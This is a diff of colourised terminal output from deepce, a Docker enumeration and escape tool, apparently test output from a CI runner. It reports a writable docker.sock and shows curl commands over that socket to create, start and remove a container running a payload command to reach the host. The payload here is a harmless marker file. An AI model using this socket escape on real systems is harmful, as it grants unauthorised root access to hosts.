@@ -79,7 +79,7 @@ OK: 32 MiB in 39 packages
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Groups .................. </span><span style="font-weight:bold;"></span><span style="color:white;font-weight:bold;"></span><span style="color:white;background-color:black;font-weight:bold;text-decoration:blink;">root</span><span style="font-weight:bold;"> bin daemon sys adm disk </span><span style="color:white;font-weight:bold;"></span><span style="color:white;background-color:black;font-weight:bold;text-decoration:blink;">wheel</span><span style="font-weight:bold;"> floppy dialout tape video</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Docker Executable ....... </span><span style="font-weight:bold;">Not Found</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Docker Sock ............. </span><span style="color:yellow;font-weight:bold;">Yes</span>
-<span style="color:white;font-weight:bold;">srw-rw----    1 root     116            0 Aug  1 13:24 /var/run/docker.sock</span>
+<span style="color:white;font-weight:bold;">srw-rw----    1 root     116            0 Aug  1 14:29 /var/run/docker.sock</span>
 
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Sock is writable ........ </span><span style="background-color:black;font-weight:bold;text-decoration:blink;">Yes</span>
 <span style="font-weight:bold;">The docker sock is writable, we should be able to enumerate docker, create containers 
@@ -96,14 +96,14 @@ OSType:linux
 Architecture:x86_64
 NCPU:2
 DockerRootDir:/var/lib/docker
-Name:fv-az79
+Name:fv-az56
 ServerVersion:19.03.12+azure</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Docker Exploits ......... </span><span style="color:yellow;font-weight:bold;">19.03.12+azure</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> CVE–2019–13139 .......... </span><span style="font-weight:bold;">No</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> CVE–2019–5736 ........... </span><span style="font-weight:bold;">No</span>
 <span style="color:#3333FF;font-weight:bold;">==================================</span><span style="color:lime;font-weight:bold;">( Enumerating Container )</span><span style="color:#3333FF;font-weight:bold;">===================================</span>
-<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container ID ............ </span><span style="color:yellow;font-weight:bold;">ba1370ba62bc</span>
-<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container Full ID ....... </span><span style="color:yellow;font-weight:bold;">ba1370ba62bc3838956d54af64296ca27951287e372d284ffd471e14b1d3422f</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container ID ............ </span><span style="color:yellow;font-weight:bold;">5f05f0b683f9</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container Full ID ....... </span><span style="color:yellow;font-weight:bold;">5f05f0b683f9543ea8aba47128e692542f823683a6bc3965205d3a5ac84a48f0</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container Name .......... </span><span style="color:red;font-weight:bold;">Could not get container name through reverse DNS</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Container IP ............ </span><span style="color:yellow;font-weight:bold;">172.17.0.2</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> DNS Server(s) ........... </span><span style="color:yellow;font-weight:bold;">168.63.129.16 </span>
@@ -111,7 +111,7 @@ ServerVersion:19.03.12+azure</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Operating System ........ </span><span style="font-weight:bold;">Linux</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Kernel .................. </span><span style="font-weight:bold;">5.3.0-1032-azure</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Arch .................... </span><span style="font-weight:bold;">x86_64</span>
-<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> CPU ..................... </span><span style="font-weight:bold;">Intel(R) Xeon(R) CPU E5-2673 v4 @ 2.30GHz</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> CPU ..................... </span><span style="font-weight:bold;">Intel(R) Xeon(R) Platinum 8171M CPU @ 2.60GHz</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Useful tools installed .. </span><span style="color:yellow;font-weight:bold;">Yes</span>
 <span style="font-weight:bold;">/usr/bin/curl
 /usr/bin/wget
@@ -132,12 +132,12 @@ and obtain root privs on the host machine\nSee
 </span><span style="text-decoration:underline;font-weight:bold;">https://stealthcopter.github.io/deepce/guides/docker-sock.md</span>
 
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Other mounts .............. </span><span style="color:yellow;font-weight:bold;">Yes</span>
-<span style="font-weight:bold;">/home/runner/work/deepce/deepce/deepce.sh /root/deepce.sh rw,relatime - ext4 /dev/sdb1 rw,discard</span>
-<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Possible host usernames ... </span><span style="color:yellow;font-weight:bold;">runner/work/deepce/deepce/deepce.sh /root/deepce.sh rw,relatime - ext4 /dev </span>
+<span style="font-weight:bold;">/home/runner/work/deepce/deepce/deepce.sh /root/deepce.sh rw,relatime - ext4 /dev/sda1 rw,discard</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Possible host usernames ... </span><span style="color:yellow;font-weight:bold;">runner </span>
 <span style="color:#3333FF;font-weight:bold;">====================================</span><span style="color:lime;font-weight:bold;">( Interesting Files )</span><span style="color:#3333FF;font-weight:bold;">=====================================</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Interesting environment variables ... </span><span style="font-weight:bold;">No</span>
 <span style="font-weight:bold;">HOME=/root
-HOSTNAME=ba1370ba62bc
+HOSTNAME=5f05f0b683f9
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 PWD=/
 SHLVL=1</span>
@@ -146,7 +146,6 @@ SHLVL=1</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Passwords in common files ........... </span><span style="font-weight:bold;">No</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Home directories .................... </span><span style="font-weight:bold;">No</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Hashes in shadow file ............... </span><span style="font-weight:bold;">No permission</span>
-
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Searching for app dirs .............. </span>
 <span style="color:#3333FF;font-weight:bold;">==================================</span><span style="color:lime;font-weight:bold;">( Enumerating Containers )</span><span style="color:#3333FF;font-weight:bold;">==================================</span>
 <span style="font-weight:bold;">By default containers can communicate with other containers on the same network and the 
@@ -160,13 +159,13 @@ host machine, this can be used to enumerate further</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Custom Command ........... </span><span style="font-weight:bold;">touch /tmp/deepce-docker-alpine-payload-command.hacked</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Clean up ................. </span><span style="font-weight:bold;">Automatic on container exit</span>
 
-<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Creating container ..... </span><span style="color:yellow;font-weight:bold;">0a6e3c3da98d052c6ede02f00f0cd97042e3a883c2e5caa14446f15c3158c67f</span>
+<span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Creating container ..... </span><span style="color:yellow;font-weight:bold;">c9e8b28465303fc5d4ebc17370b32c7d17ef4fbd9d82c21f08db85e176dff967</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> If the shell dies you can restart your listener and run the start command to fire it again </span>
-<span style="font-weight:bold;">Start Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/0a6e3c3da98d052c6ede02f00f0cd97042e3a883c2e5caa14446f15c3158c67f/start</span>
-<span style="font-weight:bold;">Logs Command: curl -s --unix-socket /var/run/docker.sock &quot;http://localhost/containers/0a6e3c3da98d052c6ede02f00f0cd97042e3a883c2e5caa14446f15c3158c67f/logs?stderr=1&amp;stdout=1&quot; --output -</span>
+<span style="font-weight:bold;">Start Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/c9e8b28465303fc5d4ebc17370b32c7d17ef4fbd9d82c21f08db85e176dff967/start</span>
+<span style="font-weight:bold;">Logs Command: curl -s --unix-socket /var/run/docker.sock &quot;http://localhost/containers/c9e8b28465303fc5d4ebc17370b32c7d17ef4fbd9d82c21f08db85e176dff967/logs?stderr=1&amp;stdout=1&quot; --output -</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Once complete remember to tidy up by stopping and removing your container with following commands </span>
-<span style="font-weight:bold;">Stop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/0a6e3c3da98d052c6ede02f00f0cd97042e3a883c2e5caa14446f15c3158c67f/stop</span>
-<span style="font-weight:bold;">Remove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/0a6e3c3da98d052c6ede02f00f0cd97042e3a883c2e5caa14446f15c3158c67f</span>
+<span style="font-weight:bold;">Stop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/c9e8b28465303fc5d4ebc17370b32c7d17ef4fbd9d82c21f08db85e176dff967/stop</span>
+<span style="font-weight:bold;">Remove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/c9e8b28465303fc5d4ebc17370b32c7d17ef4fbd9d82c21f08db85e176dff967</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Starting container ..... </span><span style="color:yellow;font-weight:bold;">Success</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Sleeping for ........... </span><span style="font-weight:bold;">2s</span>
 <span style="color:yellow;font-weight:bold;">[+]</span><span style="color:lime;font-weight:bold;"> Fetching logs .......... </span><span style="color:yellow;font-weight:bold;">Success</span>
